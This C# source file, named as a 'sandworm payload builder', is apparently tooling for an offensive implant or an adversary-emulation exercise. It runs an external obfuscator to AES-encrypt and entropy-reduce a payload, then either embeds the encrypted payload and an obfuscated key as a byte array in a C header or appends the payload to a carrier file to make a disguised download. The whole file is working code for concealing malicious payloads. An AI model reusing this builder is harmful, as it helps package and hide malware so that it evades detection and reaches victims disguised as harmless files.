using System;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace sandworm_payload_builder
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                FileVersionInfo fvi = FileVersionInfo.GetVersionInfo(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);

                Console.WriteLine(fvi.ProductName);

                Console.WriteLine("Version: {0}", fvi.ProductVersion);

                Console.Write(Environment.NewLine);

                string payloadType = args[0];

                string obfuscator = args[1];

                string payloadFile = args[2];

                string keyFile = args[3];

                string obfuscatedFile = args[4];

                string headerFile = args[5];

                string carrierFile = payloadType == "download" ? args[6] : String.Empty;

                string downloadFile = payloadType == "download" ? args[7] : String.Empty;

                Console.WriteLine("Payload type:\t\t{0}", payloadType);

                Console.WriteLine("Obfuscator binary:\t{0}", obfuscator);

                Console.WriteLine("Payload file:\t\t{0}", payloadFile);

                Console.WriteLine("Key file:\t\t{0}", keyFile);

                Console.WriteLine("Obfuscated file:\t{0}", obfuscatedFile);

                Console.WriteLine("Header file:\t\t{0}", headerFile);

                CreateObfuscatedPayload(payloadFile, obfuscator, keyFile, obfuscatedFile);

                if (payloadType == "header")
                {
                    CreatePayloadHeader(keyFile, obfuscatedFile, headerFile);
                }
                else if (payloadType == "download")
                {
                    CreatePayloadDownload(keyFile, obfuscatedFile, headerFile, carrierFile, downloadFile);
                }
                else
                {
                    throw new Exception("Specify either \"header\" or \"download\" as first command line option");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static private bool CreateObfuscatedPayload(string payloadFile, string obfuscator, string keyFile, string obfuscatedFile)
        {
            Console.Write(Environment.NewLine);

            Console.WriteLine("Creating obfucated payload");

            String command = String.Format(@"--aes --entropy-reduce {0} {1} {2}", payloadFile, keyFile, obfuscatedFile);

            ProcessStartInfo psi = new ProcessStartInfo(obfuscator);

            psi.Arguments = command;

            Process cmd = Process.Start(psi);

            cmd.WaitForExit();

            return cmd.ExitCode == 0;
        }

        static private bool WritePrologHeader(StreamWriter writer)
        {
            writer.WriteLine("#pragma once");

            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            writer.WriteLine("#include <stdint.h>");

            return true;
        }

        static private bool WriteKeyHeader(StreamWriter writer, string keyFile)
        {
            byte[] key = File.ReadAllBytes(keyFile);

            StringBuilder hexKey = new StringBuilder();

            foreach (byte b in key)
            {
                hexKey.AppendFormat("{0:x2}", b);
            }

            writer.WriteLine("#include \"xObfuscation.h\"");

            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            writer.WriteLine("#define X_PAYLOAD_KEY\tX_OBFUSCATED_STRING_A(\"{0}\")", hexKey.ToString());

            return true;
        }

        static private bool WritePayloadHeader(StreamWriter writer, string payloadFile)
        {
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            byte[] payload = File.ReadAllBytes(payloadFile);

            StringBuilder hexPayload = new StringBuilder();

            int last = payload.Length - 1;

            for (int i = 0; i <= last; i++)
            {
                bool newline = (i + 1) % 8 == 0;

                bool indent = i % 8 == 0;

                if (indent)
                {
                    hexPayload.Append("\t");
                }

                hexPayload.AppendFormat("0x{0:x2}", payload[i]);

                if (i != last)
                {
                    hexPayload.Append(", ");

                    if (newline)
                    {
                        hexPayload.Append(Environment.NewLine);
                    }
                }
            }

            writer.WriteLine("static const uint8_t* s_payload =");

            writer.WriteLine("{");

            writer.WriteLine(hexPayload.ToString());

            writer.WriteLine("};");

            return true;
        }

        static private bool CreatePayloadHeader(string keyFile, string payloadFile, string headerFile)
        {
            StreamWriter writer = new StreamWriter(headerFile);

            WritePrologHeader(writer);

            WriteKeyHeader(writer, keyFile);

            WritePayloadHeader(writer, payloadFile);

            writer.Close();

            return true;
        }

        static private bool CreatePayloadDownload(string keyFile, string payloadFile, string headerFile, string carrierFile, string downloadFile)
        {
            Console.Write(Environment.NewLine);

            Console.WriteLine("Carrier file:\t\t{0}", carrierFile);

            Console.WriteLine("Download file:\t\t{0}", downloadFile);

            StreamWriter writerHeader = new StreamWriter(headerFile);

            WritePrologHeader(writerHeader);

            WriteKeyHeader(writerHeader, keyFile);

            writerHeader.Close();

            BinaryWriter writerDownload = new BinaryWriter(new FileStream(downloadFile, FileMode.Create));

            writerDownload.Write(File.ReadAllBytes(carrierFile));

            byte[] payload = File.ReadAllBytes(payloadFile);

            writerDownload.Write(payload);

            writerDownload.Write(payload.Length);

            writerDownload.Close();

            return true;
        }
    }
}
